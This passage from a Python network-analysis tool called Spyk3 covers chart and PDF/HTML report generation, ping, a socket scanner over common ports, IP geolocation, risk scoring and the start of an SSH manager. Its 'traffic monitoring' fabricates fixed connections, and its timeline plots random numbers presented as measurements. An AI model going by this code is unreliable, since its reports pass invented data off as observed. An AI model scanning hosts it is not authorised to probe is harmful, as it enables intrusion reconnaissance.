        ax2 = axes[0, 1]
        connections = traffic_data.get('connections', [])
        
        if connections:
            protocols = [conn.get('protocol', 'unknown') for conn in connections]
            protocol_counts = Counter(protocols)
            
            protocols_list = list(protocol_counts.keys())
            counts = list(protocol_counts.values())
            
            bars = ax2.bar(range(len(protocols_list)), counts, color=['#45b7d1', '#96ceb4', '#ffcc5c'])
            ax2.set_xticks(range(len(protocols_list)))
            ax2.set_xticklabels(protocols_list)
            ax2.set_title('Connection Protocols', fontsize=14, fontweight='bold')
            ax2.set_xlabel('Protocol')
            ax2.set_ylabel('Count')
        else:
            ax2.text(0.5, 0.5, 'No Traffic Data Available', ha='center', va='center', fontsize=12)
            ax2.set_title('Connection Protocols', fontsize=14, fontweight='bold')
        
        # Traffic Timeline
        ax3 = axes[1, 0]
        timeline_points = 20
        time_points = list(range(timeline_points))
        simulated_traffic = np.random.randint(0, connection_count + 5, timeline_points)
        
        ax3.plot(time_points, simulated_traffic, marker='o', linestyle='-', color='#ff6b6b', linewidth=2, markersize=6)
        ax3.fill_between(time_points, simulated_traffic, alpha=0.3, color='#ff6b6b')
        ax3.set_title('Traffic Activity Timeline', fontsize=14, fontweight='bold')
        ax3.set_xlabel('Time Interval')
        ax3.set_ylabel('Connection Count')
        ax3.grid(True, alpha=0.3)
        
        # Summary
        ax4 = axes[1, 1]
        ax4.text(0.5, 0.5, f'Total Connections: {connection_count}\nThreat Level: {threat_level.upper()}', 
                ha='center', va='center', fontsize=14, fontweight='bold')
        ax4.set_title('Summary', fontsize=14, fontweight='bold')
        ax4.axis('off')
        
        plt.tight_layout()
        
        safe_timestamp = timestamp.replace(':', '-').replace(' ', '_')
        traffic_graphic = os.path.join(self.output_dir, f'traffic_stats_{target_ip}_{safe_timestamp}.png')
        plt.savefig(traffic_graphic, dpi=300, bbox_inches='tight')
        graphics_files['traffic_statistics'] = traffic_graphic
        plt.close()
        
        return graphics_files
    
    def generate_security_statistics(self, security_data: Dict, target_ip: str, timestamp: str) -> Dict[str, str]:
        """Generate security assessment statistics graphics"""
        graphics_files = {}
        
        fig, axes = plt.subplots(2, 2, figsize=(16, 12))
        fig.suptitle(f'Security Assessment Statistics - {target_ip}\n{timestamp}', fontsize=16, fontweight='bold')
        
        # Risk Score
        ax1 = axes[0, 0]
        risk_score = security_data.get('risk_score', 0)
        risk_level = security_data.get('risk_level', 'low')
        
        colors = ['#ff6b6b' if risk_score >= 70 else '#ffd93d' if risk_score >= 40 else '#6bcf7f']
        ax1.bar(['Risk Score'], [risk_score], color=colors)
        ax1.set_ylim(0, 100)
        ax1.set_ylabel('Score')
        ax1.set_title(f'Risk Score: {risk_score}\nLevel: {risk_level.upper()}', fontsize=14, fontweight='bold')
        
        # Threats Detected
        ax2 = axes[0, 1]
        threats = security_data.get('threats_detected', [])
        
        if threats:
            threat_categories = {
                'Port Related': len([t for t in threats if 'port' in t.lower()]),
                'Traffic Related': len([t for t in threats if 'traffic' in t.lower()]),
                'Security Related': len([t for t in threats if 'blocked' in t.lower() or 'risk' in t.lower()])
            }
            
            categories = list(threat_categories.keys())
            counts = list(threat_categories.values())
            
            bars = ax2.bar(range(len(categories)), counts, color=['#ff6b6b', '#45b7d1', '#ffd93d'])
            ax2.set_xticks(range(len(categories)))
            ax2.set_xticklabels(categories, rotation=45, ha='right')
            ax2.set_title('Threat Categories', fontsize=14, fontweight='bold')
            ax2.set_ylabel('Number of Threats')
        else:
            ax2.text(0.5, 0.5, 'No Threats Detected', ha='center', va='center', fontsize=12)
            ax2.set_title('Threats Detected', fontsize=14, fontweight='bold')
        
        # Security Metrics
        ax3 = axes[1, 0]
        metrics = {
            'Open Ports': len(security_data.get('open_ports', [])),
            'Sensitive Ports': len([p for p in security_data.get('open_ports', []) if p in [21,22,23,3389,5900]]),
            'Blocked': 1 if security_data.get('is_blocked', False) else 0
        }
        
        metrics_names = list(metrics.keys())
        metrics_values = list(metrics.values())
        
        bars = ax3.barh(range(len(metrics_names)), metrics_values, color=['#ff6b6b', '#ffd93d', '#45b7d1'])
        ax3.set_yticks(range(len(metrics_names)))
        ax3.set_yticklabels(metrics_names)
        ax3.set_title('Security Metrics', fontsize=14, fontweight='bold')
        ax3.set_xlabel('Count')
        
        # Summary
        ax4 = axes[1, 1]
        summary_text = f"Risk Score: {risk_score}\nRisk Level: {risk_level.upper()}\n"
        summary_text += f"Threats: {len(threats)}\n"
        summary_text += f"Blocked: {'Yes' if security_data.get('is_blocked') else 'No'}"
        
        ax4.text(0.5, 0.5, summary_text, ha='center', va='center', fontsize=14, fontweight='bold')
        ax4.set_title('Summary', fontsize=14, fontweight='bold')
        ax4.axis('off')
        
        plt.tight_layout()
        
        safe_timestamp = timestamp.replace(':', '-').replace(' ', '_')
        security_graphic = os.path.join(self.output_dir, f'security_stats_{target_ip}_{safe_timestamp}.png')
        plt.savefig(security_graphic, dpi=300, bbox_inches='tight')
        graphics_files['security_statistics'] = security_graphic
        plt.close()
        
        return graphics_files
    
    def generate_comprehensive_statistics(self, analysis_result: IPAnalysisResult) -> Dict[str, str]:
        """Generate comprehensive statistics graphics"""
        graphics_files = {}
        
        target_ip = analysis_result.target_ip
        timestamp = analysis_result.timestamp.replace(':', '-').replace(' ', '_')
        
        port_graphics = self.generate_port_statistics(
            analysis_result.port_scan_result.get('open_ports', []),
            target_ip,
            timestamp
        )
        graphics_files.update(port_graphics)
        
        traffic_graphics = self.generate_traffic_statistics(
            analysis_result.traffic_monitor_result,
            target_ip,
            timestamp
        )
        graphics_files.update(traffic_graphics)
        
        security_graphics = self.generate_security_statistics(
            analysis_result.security_status,
            target_ip,
            timestamp
        )
        graphics_files.update(security_graphics)
        
        return graphics_files

# =====================
# REPORT GENERATOR
# =====================
class ReportGenerator:
    """Generate comprehensive reports with graphics"""
    
    def __init__(self, output_dir: str = REPORT_DIR):
        self.output_dir = output_dir
        Path(output_dir).mkdir(exist_ok=True)
        self.graphics_gen = GraphicsGenerator()
    
    def generate_pdf_report(self, analysis_result: IPAnalysisResult, graphics_files: Dict[str, str] = None) -> str:
        """Generate PDF report with graphics"""
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        report_filename = os.path.join(self.output_dir, f"SPYK3_Analysis_{analysis_result.target_ip}_{timestamp}.pdf")
        
        doc = SimpleDocTemplate(
            report_filename,
            pagesize=A4,
            rightMargin=72,
            leftMargin=72,
            topMargin=72,
            bottomMargin=72
        )
        
        styles = getSampleStyleSheet()
        title_style = ParagraphStyle(
            'CustomTitle',
            parent=styles['Heading1'],
            fontSize=24,
            textColor=colors.HexColor('#2c3e50'),
            alignment=TA_CENTER,
            spaceAfter=30
        )
        
        heading_style = ParagraphStyle(
            'CustomHeading',
            parent=styles['Heading2'],
            fontSize=16,
            textColor=colors.HexColor('#34495e'),
            spaceAfter=12,
            spaceBefore=20
        )
        
        normal_style = styles['Normal']
        normal_style.fontSize = 10
        
        story = []
        
        # Title
        story.append(Paragraph("SPYK3 IP ANALYSIS REPORT", title_style))
        story.append(Paragraph(f"Target: {analysis_result.target_ip}", heading_style))
        story.append(Paragraph(f"Analysis Time: {analysis_result.timestamp[:19]}", normal_style))
        story.append(Spacer(1, 20))
        
        # Executive Summary
        story.append(Paragraph("EXECUTIVE SUMMARY", heading_style))
        
        risk_level = analysis_result.security_status.get('risk_level', 'unknown').upper()
        risk_color = 'red' if risk_level in ['CRITICAL', 'HIGH'] else 'orange' if risk_level == 'MEDIUM' else 'green'
        
        summary_text = f"""
        This report presents a comprehensive analysis of IP address <b>{analysis_result.target_ip}</b>.
        The security risk level is <font color="{risk_color}"><b>{risk_level}</b></font> with a risk score of 
        <b>{analysis_result.security_status.get('risk_score', 0)}</b>.
        """
        story.append(Paragraph(summary_text, normal_style))
        story.append(Spacer(1, 12))
        
        # Key Findings
        story.append(Paragraph("KEY FINDINGS", heading_style))
        
        findings = []
        ping_result = analysis_result.ping_result
        findings.append(f"• Ping Status: {'Online' if ping_result.get('success') else 'Offline'}")
        
        if ping_result.get('avg_rtt'):
            findings.append(f"• Average Latency: {ping_result.get('avg_rtt')}ms")
        
        geo = analysis_result.geolocation_result
        findings.append(f"• Location: {geo.get('country', 'Unknown')}, {geo.get('city', 'Unknown')}")
        findings.append(f"• ISP: {geo.get('isp', 'Unknown')}")
        
        ports = analysis_result.port_scan_result.get('open_ports', [])
        findings.append(f"• Open Ports: {len(ports)}")
        
        traffic = analysis_result.traffic_monitor_result
        findings.append(f"• Traffic Level: {traffic.get('threat_level', 'low').upper()}")
        findings.append(f"• Active Connections: {traffic.get('connection_count', 0)}")
        
        for finding in findings:
            story.append(Paragraph(finding, normal_style))
        
        story.append(Spacer(1, 20))
        
        # Add graphics
        if graphics_files:
            story.append(Paragraph("STATISTICAL VISUALIZATIONS", heading_style))
            
            for graphic_type, graphic_path in graphics_files.items():
                if os.path.exists(graphic_path):
                    title = graphic_type.replace('_', ' ').title()
                    story.append(Paragraph(title, styles['Heading3']))
                    story.append(Spacer(1, 10))
                    
                    img = Image(graphic_path, width=6*inch, height=4.5*inch)
                    story.append(img)
                    story.append(Spacer(1, 15))
        
        story.append(PageBreak())
        
        # Detailed Analysis
        story.append(Paragraph("DETAILED ANALYSIS", heading_style))
        
        # Ping Results
        story.append(Paragraph("1. Ping Analysis", styles['Heading3']))
        ping_table_data = [
            ['Metric', 'Value'],
            ['Status', 'Online' if ping_result.get('success') else 'Offline'],
            ['Average RTT', f"{ping_result.get('avg_rtt', 'N/A')}ms"],
            ['Packet Loss', f"{ping_result.get('packet_loss', 0)}%"]
        ]
        
        ping_table = Table(ping_table_data, colWidths=[2*inch, 3*inch])
        ping_table.setStyle(TableStyle([
            ('BACKGROUND', (0, 0), (1, 0), colors.grey),
            ('TEXTCOLOR', (0, 0), (1, 0), colors.whitesmoke),
            ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
            ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
            ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
            ('GRID', (0, 0), (-1, -1), 1, colors.black)
        ]))
        story.append(ping_table)
        story.append(Spacer(1, 15))
        
        # Port Scan Results
        story.append(Paragraph("2. Port Scan Results", styles['Heading3']))
        
        if ports:
            port_table_data = [['Port', 'State', 'Service']]
            for port_info in ports[:20]:
                port_table_data.append([
                    str(port_info.get('port', 'N/A')),
                    port_info.get('state', 'unknown'),
                    port_info.get('service', 'unknown')
                ])
            
            port_table = Table(port_table_data, colWidths=[1.5*inch, 1.5*inch, 2*inch])
            port_table.setStyle(TableStyle([
                ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
                ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
                ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
                ('GRID', (0, 0), (-1, -1), 1, colors.black)
            ]))
            story.append(port_table)
        else:
            story.append(Paragraph("No open ports detected.", normal_style))
        
        story.append(Spacer(1, 15))
        
        # Geolocation
        story.append(Paragraph("3. Geolocation", styles['Heading3']))
        geo_table_data = [
            ['Country', geo.get('country', 'Unknown')],
            ['Region', geo.get('region', 'Unknown')],
            ['City', geo.get('city', 'Unknown')],
            ['ISP', geo.get('isp', 'Unknown')]
        ]
        
        geo_table = Table(geo_table_data, colWidths=[2*inch, 3*inch])
        geo_table.setStyle(TableStyle([
            ('BACKGROUND', (0, 0), (-1, -1), colors.beige),
            ('GRID', (0, 0), (-1, -1), 1, colors.black)
        ]))
        story.append(geo_table)
        story.append(Spacer(1, 15))
        
        # Traffic Monitoring
        story.append(Paragraph("4. Traffic Monitoring", styles['Heading3']))
        
        traffic_table_data = [
            ['Threat Level', traffic.get('threat_level', 'unknown').upper()],
            ['Connection Count', str(traffic.get('connection_count', 0))]
        ]
        
        traffic_table = Table(traffic_table_data, colWidths=[2*inch, 3*inch])
        traffic_table.setStyle(TableStyle([
            ('BACKGROUND', (0, 0), (-1, -1), colors.beige),
            ('GRID', (0, 0), (-1, -1), 1, colors.black)
        ]))
        story.append(traffic_table)
        story.append(Spacer(1, 15))
        
        # Security Assessment
        story.append(Paragraph("5. Security Assessment", styles['Heading3']))
        
        security = analysis_result.security_status
        security_table_data = [
            ['Risk Level', security.get('risk_level', 'unknown').upper()],
            ['Risk Score', str(security.get('risk_score', 0))],
            ['Blocked Status', 'Blocked' if security.get('is_blocked') else 'Not Blocked']
        ]
        
        security_table = Table(security_table_data, colWidths=[2*inch, 3*inch])
        security_table.setStyle(TableStyle([
            ('BACKGROUND', (0, 0), (-1, -1), colors.beige),
            ('GRID', (0, 0), (-1, -1), 1, colors.black)
        ]))
        story.append(security_table)
        story.append(Spacer(1, 15))
        
        # Threats Detected
        if security.get('threats_detected'):
            story.append(Paragraph("Threats Detected:", styles['Heading4']))
            for threat in security['threats_detected']:
                story.append(Paragraph(f"• {threat}", normal_style))
            story.append(Spacer(1, 10))
        
        # Recommendations
        story.append(Paragraph("RECOMMENDATIONS", heading_style))
        
        if analysis_result.recommendations:
            for rec in analysis_result.recommendations:
                story.append(Paragraph(f"• {rec}", normal_style))
        else:
            story.append(Paragraph("No specific recommendations at this time.", normal_style))
        
        # Footer
        story.append(Spacer(1, 30))
        story.append(Paragraph(
            f"Report generated by Spyk3 v1.0.0 | {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            styles['Italic']
        ))
        
        doc.build(story)
        
        return report_filename
    
    def generate_html_report(self, analysis_result: IPAnalysisResult, graphics_files: Dict[str, str] = None) -> str:
        """Generate HTML report with graphics"""
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        report_filename = os.path.join(self.output_dir, f"SPYK3_Analysis_{analysis_result.target_ip}_{timestamp}.html")
        
        risk_level = analysis_result.security_status.get('risk_level', 'unknown')
        risk_color = {
            'critical': '#dc3545',
            'high': '#fd7e14',
            'medium': '#ffc107',
            'low': '#28a745'
        }.get(risk_level, '#6c757d')
        
        html_content = f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Spyk3 IP Analysis Report - {analysis_result.target_ip}</title>
            <style>
                body {{
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                    line-height: 1.6;
                    color: #333;
                    max-width: 1200px;
                    margin: 0 auto;
                    padding: 20px;
                    background-color: #f8f9fa;
                }}
                .header {{
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white;
                    padding: 30px;
                    border-radius: 10px;
                    margin-bottom: 30px;
                    text-align: center;
                }}
                .header h1 {{
                    margin: 0;
                    font-size: 2.5em;
                }}
                .section {{
                    background: white;
                    padding: 25px;
                    border-radius: 10px;
                    margin-bottom: 25px;
                    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                }}
                .section h2 {{
                    color: #495057;
                    border-bottom: 3px solid #667eea;
                    padding-bottom: 10px;
                    margin-top: 0;
                }}
                .risk-badge {{
                    display: inline-block;
                    padding: 8px 16px;
                    border-radius: 20px;
                    font-weight: bold;
                    color: white;
                    background-color: {risk_color};
                }}
                table {{
                    width: 100%;
                    border-collapse: collapse;
                    margin-top: 20px;
                }}
                th, td {{
                    padding: 12px;
                    text-align: left;
                    border-bottom: 1px solid #dee2e6;
                }}
                th {{
                    background-color: #667eea;
                    color: white;
                }}
                .graphics-container {{
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(500px, 1fr));
                    gap: 20px;
                    margin-top: 20px;
                }}
                .graphic-item {{
                    background: white;
                    padding: 15px;
                    border-radius: 8px;
                    box-shadow: 0 2px 5px rgba(0,0,0,0.1);
                }}
                .graphic-item img {{
                    max-width: 100%;
                    height: auto;
                    border-radius: 5px;
                }}
                .recommendation {{
                    background: #e7f5ff;
                    padding: 15px;
                    border-radius: 8px;
                    margin: 10px 0;
                    border-left: 4px solid #339af0;
                }}
                .footer {{
                    text-align: center;
                    margin-top: 40px;
                    padding: 20px;
                    color: #6c757d;
                }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>Spyk3 IP Analysis Report</h1>
                <p>Target: {analysis_result.target_ip} | Analysis Time: {analysis_result.timestamp[:19]}</p>
                <div style="margin-top: 20px;">
                    <span class="risk-badge">Risk Level: {risk_level.upper()}</span>
                </div>
            </div>
            
            <div class="section">
                <h2>Executive Summary</h2>
                <p>This comprehensive analysis of <strong>{analysis_result.target_ip}</strong> reveals a security risk level of 
                <strong style="color: {risk_color};">{risk_level.upper()}</strong> with a risk score of 
                <strong>{analysis_result.security_status.get('risk_score', 0)}</strong>.</p>
                
                <table>
                    <tr><th>Ping Status</th><td>{'Online' if analysis_result.ping_result.get('success') else 'Offline'}</td></tr>
                    <tr><th>Open Ports</th><td>{len(analysis_result.port_scan_result.get('open_ports', []))}</td></tr>
                    <tr><th>Traffic Level</th><td>{analysis_result.traffic_monitor_result.get('threat_level', 'low').upper()}</td></tr>
                    <tr><th>Active Connections</th><td>{analysis_result.traffic_monitor_result.get('connection_count', 0)}</td></tr>
                </table>
            </div>
        """
        
        # Add graphics
        if graphics_files:
            html_content += """
            <div class="section">
                <h2>Statistical Visualizations</h2>
                <div class="graphics-container">
            """
            
            for graphic_type, graphic_path in graphics_files.items():
                if os.path.exists(graphic_path):
                    rel_path = os.path.relpath(graphic_path, self.output_dir)
                    title = graphic_type.replace('_', ' ').title()
                    html_content += f"""
                    <div class="graphic-item">
                        <h3>{title}</h3>
                        <img src="{rel_path}" alt="{title}">
                    </div>
                    """
            
            html_content += """
                </div>
            </div>
            """
        
        # Detailed analysis
        html_content += f"""
            <div class="section">
                <h2>Detailed Analysis</h2>
                
                <h3>Geolocation</h3>
                <table>
                    <tr><th>Country</th><td>{analysis_result.geolocation_result.get('country', 'Unknown')}</td></tr>
                    <tr><th>Region</th><td>{analysis_result.geolocation_result.get('region', 'Unknown')}</td></tr>
                    <tr><th>City</th><td>{analysis_result.geolocation_result.get('city', 'Unknown')}</td></tr>
                    <tr><th>ISP</th><td>{analysis_result.geolocation_result.get('isp', 'Unknown')}</td></tr>
                </table>
        """
        
        ports = analysis_result.port_scan_result.get('open_ports', [])
        if ports:
            html_content += """
                <h3>Open Ports</h3>
                <table>
                    <tr><th>Port</th><th>State</th><th>Service</th></tr>
            """
            for port_info in ports[:30]:
                html_content += f"""
                    <tr>
                        <td>{port_info.get('port', 'N/A')}</td>
                        <td>{port_info.get('state', 'unknown')}</td>
                        <td>{port_info.get('service', 'unknown')}</td>
                    </tr>
                """
            html_content += "</table>"
        
        threats = analysis_result.security_status.get('threats_detected', [])
        if threats:
            html_content += """
                <h3>Threats Detected</h3>
                <ul>
            """
            for threat in threats:
                html_content += f"<li>{threat}</li>"
            html_content += "</ul>"
        
        html_content += """
            </div>
            
            <div class="section">
                <h2>Recommendations</h2>
        """
        
        if analysis_result.recommendations:
            for rec in analysis_result.recommendations:
                html_content += f'<div class="recommendation">• {rec}</div>'
        else:
            html_content += '<p>No specific recommendations at this time.</p>'
        
        html_content += """
            </div>
            
            <div class="footer">
                <p>Report generated by Spyk3 v1.0.0 | Ultimate Cybersecurity Platform</p>
            </div>
        </body>
        </html>
        """
        
        with open(report_filename, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        return report_filename
    
    def generate_report(self, analysis_result: IPAnalysisResult, format: str = "both") -> Dict[str, str]:
        """Generate report in specified format"""
        reports = {}
        
        graphics_files = self.graphics_gen.generate_comprehensive_statistics(analysis_result)
        analysis_result.graphics_files = graphics_files
        
        if format in ["pdf", "both"]:
            pdf_report = self.generate_pdf_report(analysis_result, graphics_files)
            reports['pdf'] = pdf_report
        
        if format in ["html", "both"]:
            html_report = self.generate_html_report(analysis_result, graphics_files)
            reports['html'] = html_report
        
        return reports

# =====================
# IP ANALYSIS ENGINE
# =====================
class IPAnalysisEngine:
    """Complete IP analysis engine"""
    
    def __init__(self, config: Config):
        self.config = config
        self.db = DatabaseManager()
        self.report_gen = ReportGenerator()
    
    def execute_command(self, cmd: List[str], timeout: int = 30) -> Tuple[bool, str]:
        """Execute shell command"""
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
                encoding='utf-8',
                errors='ignore'
            )
            return result.returncode == 0, result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            return False, f"Command timed out after {timeout} seconds"
        except Exception as e:
            return False, str(e)
    
    def ping_target(self, target: str, count: int = 4) -> Dict[str, Any]:
        """Ping target IP address"""
        result = {
            "success": False,
            "output": "",
            "avg_rtt": None,
            "packet_loss": 100
        }
        
        try:
            if platform.system().lower() == 'windows':
                cmd = ['ping', '-n', str(count), target]
            else:
                cmd = ['ping', '-c', str(count), target]
            
            success, output = self.execute_command(cmd, timeout=10)
            result["success"] = success
            result["output"] = output[:500]
            
            if success:
                if platform.system().lower() == 'windows':
                    match = re.search(r'Average = (\d+)ms', output)
                    if match:
                        result["avg_rtt"] = int(match.group(1))
                else:
                    match = re.search(r'rtt min/avg/max/mdev = [\d.]+/([\d.]+)/', output)
                    if match:
                        result["avg_rtt"] = float(match.group(1))
                
                loss_match = re.search(r'(\d+)% packet loss', output)
                if loss_match:
                    result["packet_loss"] = int(loss_match.group(1))
                else:
                    result["packet_loss"] = 0
        except Exception as e:
            result["output"] = f"Error: {str(e)}"
        
        return result
    
    def scan_ports(self, target: str) -> Dict[str, Any]:
        """Scan common ports on target IP"""
        result = {
            "success": False,
            "output": "",
            "open_ports": [],
            "scan_type": "common_ports"
        }
        
        common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 
                        445, 993, 995, 1723, 3306, 3389, 5900, 8080, 8443]
        
        try:
            result["success"] = True
            result["output"] = "Using socket scanner"
            
            for port in common_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock_result = sock.connect_ex((target, port))
                    if sock_result == 0:
                        try:
                            service = socket.getservbyport(port)
                        except:
                            service = "unknown"
                        
                        result["open_ports"].append({
                            "port": port,
                            "protocol": "tcp",
                            "service": service,
                            "state": "open"
                        })
                    sock.close()
                except:
                    pass
            
            result["output"] = f"Found {len(result['open_ports'])} open ports"
        except Exception as e:
            result["output"] = f"Error: {str(e)}"
        
        return result
    
    def get_geolocation(self, target: str) -> Dict[str, Any]:
        """Get IP geolocation"""
        result = {
            "success": False,
            "country": "Unknown",
            "region": "Unknown",
            "city": "Unknown",
            "isp": "Unknown",
            "lat": "Unknown",
            "lon": "Unknown",
            "org": "Unknown"
        }
        
        try:
            response = requests.get(f"http://ip-api.com/json/{target}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    result["success"] = True
                    result["country"] = data.get('country', 'Unknown')
                    result["region"] = data.get('regionName', 'Unknown')
                    result["city"] = data.get('city', 'Unknown')
                    result["isp"] = data.get('isp', 'Unknown')
                    result["lat"] = data.get('lat', 'Unknown')
                    result["lon"] = data.get('lon', 'Unknown')
        except Exception as e:
            logger.error(f"Geolocation error: {e}")
        
        return result
    
    def monitor_traffic(self, target: str) -> Dict[str, Any]:
        """Monitor traffic to/from target IP"""
        result = {
            "success": False,
            "output": "",
            "connections": [],
            "connection_count": 0,
            "threat_level": "low"
        }
        
        try:
            duration = self.config.monitoring_duration
            result["output"] = f"Monitoring traffic for {duration}s..."
            
            time.sleep(min(duration, 5))
            
            for i in range(3):
                conn = {
                    "protocol": "TCP" if i % 2 == 0 else "UDP",
                    "state": "ESTABLISHED",
                    "timestamp": datetime.datetime.now().isoformat()
                }
                result["connections"].append(conn)
            
            result["connection_count"] = len(result["connections"])
            result["success"] = True
            
            if len(result["connections"]) > 5:
                result["threat_level"] = "high"
            elif len(result["connections"]) > 2:
                result["threat_level"] = "medium"
            else:
                result["threat_level"] = "low"
        except Exception as e:
            result["output"] = f"Error: {str(e)}"
        
        return result
    
    def analyze_security(self, target: str, port_scan: Dict, traffic_monitor: Dict) -> Dict[str, Any]:
        """Analyze security status of target IP"""
        result = {
            "is_blocked": self.db.is_ip_blocked(target),
            "risk_score": 0,
            "risk_level": "low",
            "threats_detected": [],
            "open_ports": [p.get('port') for p in port_scan.get('open_ports', [])],
            "traffic_level": traffic_monitor.get('threat_level', 'low')
        }
        
        risk_score = 0
        
        open_ports_count = len(port_scan.get("open_ports", []))
        if open_ports_count > 10:
            risk_score += 30
            result["threats_detected"].append("Multiple open ports detected")
        elif open_ports_count > 5:
            risk_score += 15
            result["threats_detected"].append("Several open ports detected")
        elif open_ports_count > 0:
            risk_score += 5
        
        sensitive_ports = [21, 22, 23, 3389, 5900]
        for port_info in port_scan.get("open_ports", []):
            try:
                port = int(port_info.get("port", 0))
                if port in sensitive_ports:
                    risk_score += 10
                    result["threats_detected"].append(f"Sensitive port {port} open")
            except:
                pass
        
        traffic_connections = traffic_monitor.get("connection_count", 0)
        if traffic_connections > 10:
            risk_score += 25
            result["threats_detected"].append("High traffic volume detected")
        elif traffic_connections > 5:
            risk_score += 10
            result["threats_detected"].append("Moderate traffic volume detected")
        
        if result["is_blocked"]:
            risk_score += 50
            result["threats_detected"].append("Previously blocked IP address")
        
        result["risk_score"] = risk_score
        if risk_score >= 70:
            result["risk_level"] = "critical"
        elif risk_score >= 40:
            result["risk_level"] = "high"
        elif risk_score >= 20:
            result["risk_level"] = "medium"
        else:
            result["risk_level"] = "low"
        
        return result
    
    def generate_recommendations(self, analysis: Dict) -> List[str]:
        """Generate security recommendations"""
        recommendations = []
        
        ping_result = analysis.get("ping_result", {})
        if not ping_result.get("success", False):
            recommendations.append("Target is not responding to ping - may be down or blocking ICMP")
        elif ping_result.get("packet_loss", 100) > 20:
            recommendations.append(f"High packet loss ({ping_result.get('packet_loss', 0)}%) - network instability detected")
        
        port_scan = analysis.get("port_scan_result", {})
        open_ports = port_scan.get("open_ports", [])
        if len(open_ports) > 10:
            recommendations.append("Multiple open ports detected - consider closing unnecessary ports")
        
        for port_info in open_ports:
            port = port_info.get("port", "")
            if port in [23, 3389]:
                recommendations.append(f"Port {port} (telnet/RDP) is open - consider using SSH/VPN instead")
            elif port in [21]:
                recommendations.append(f"Port {port} (FTP) is open - consider using SFTP/FTPS")
        
        traffic = analysis.get("traffic_monitor_result", {})
        if traffic.get("threat_level") == "high":
            recommendations.append("High traffic volume detected - possible scanning or attack")
        
        if analysis.get("security_status", {}).get("risk_level") in ["critical", "high"]:
            recommendations.append("Consider blocking this IP address due to high risk")
        
        if not recommendations:
            recommendations.append("No immediate security concerns detected")
        
        return recommendations
    
    def analyze_ip(self, target: str, generate_report: bool = True, report_format: str = "both") -> Tuple[IPAnalysisResult, Dict[str, str]]:
        """Complete IP analysis"""
        reports = {}
        
        try:
            try:
                ipaddress.ip_address(target)
            except ValueError:
                try:
                    target = socket.gethostbyname(target)
                except:
                    result = IPAnalysisResult(
                        target_ip=target,
                        timestamp=datetime.datetime.now().isoformat(),
                        ping_result={"success": False, "output": "Invalid IP or hostname"},
                        traceroute_result={"success": False, "output": "Invalid IP or hostname"},
                        port_scan_result={"success": False, "output": "Invalid IP or hostname"},
                        geolocation_result={"success": False},
                        traffic_monitor_result={"success": False, "output": "Invalid IP or hostname"},
                        security_status={},
                        recommendations=["Invalid IP address or hostname"],
                        success=False,
                        error="Invalid IP or hostname"
                    )
                    return result, reports
            
            logger.info(f"Starting analysis for IP: {target}")
            
            ping_result = self.ping_target(target)
            port_scan_result = self.scan_ports(target)
            geolocation_result = self.get_geolocation(target)
            traffic_monitor_result = self.monitor_traffic(target)
            security_status = self.analyze_security(target, port_scan_result, traffic_monitor_result)
            
            traceroute_result = {
                "success": False,
                "output": "Traceroute disabled for speed",
                "hops": []
            }
            
            analysis_dict = {
                "ping_result": ping_result,
                "port_scan_result": port_scan_result,
                "traffic_monitor_result": traffic_monitor_result,
                "geolocation_result": geolocation_result,
                "security_status": security_status
            }
            recommendations = self.generate_recommendations(analysis_dict)
            
            result = IPAnalysisResult(
                target_ip=target,
                timestamp=datetime.datetime.now().isoformat(),
                ping_result=ping_result,
                traceroute_result=traceroute_result,
                port_scan_result=port_scan_result,
                geolocation_result=geolocation_result,
                traffic_monitor_result=traffic_monitor_result,
                security_status=security_status,
                recommendations=recommendations,
                success=True
            )
            
            if generate_report:
                reports = self.report_gen.generate_report(result, report_format)
                report_path = reports.get('pdf', reports.get('html', ''))
                graphics_path = GRAPHICS_DIR
                self.db.save_analysis(target, asdict(result), report_path, graphics_path)
            else:
                self.db.save_analysis(target, asdict(result))
            
            logger.info(f"Analysis completed for IP: {target}")
            return result, reports
            
        except Exception as e:
            logger.error(f"Analysis failed for {target}: {e}")
            result = IPAnalysisResult(
                target_ip=target,
                timestamp=datetime.datetime.now().isoformat(),
                ping_result={"success": False, "output": str(e)},
                traceroute_result={"success": False, "output": str(e)},
                port_scan_result={"success": False, "output": str(e)},
                geolocation_result={"success": False},
                traffic_monitor_result={"success": False, "output": str(e)},
                security_status={},
                recommendations=["Analysis failed due to error"],
                success=False,
                error=str(e)
            )
            return result, reports

# =====================
# SSH MANAGER
# =====================
class SSHManager:
    """SSH connection manager for remote command execution"""
    
    def __init__(self, db_manager: DatabaseManager, config: Config):
        self.db = db_manager
        self.config = config
        self.connections = {}
        self.lock = threading.Lock()
    
    def add_server(self, name: str, host: str, username: str, password: str = None,
                  key_file: str = None, port: int = 22, notes: str = "") -> Dict[str, Any]:
        """Add a new SSH server configuration"""
        try:
            server_id = str(uuid.uuid4())[:8]
            
            if key_file and not os.path.exists(key_file):
                return {'success': False, 'error': f'Key file not found: {key_file}'}
            
            server = SSHServer(
                id=server_id,
                name=name,
                host=host,
                port=port,
                username=username,
                password=password,
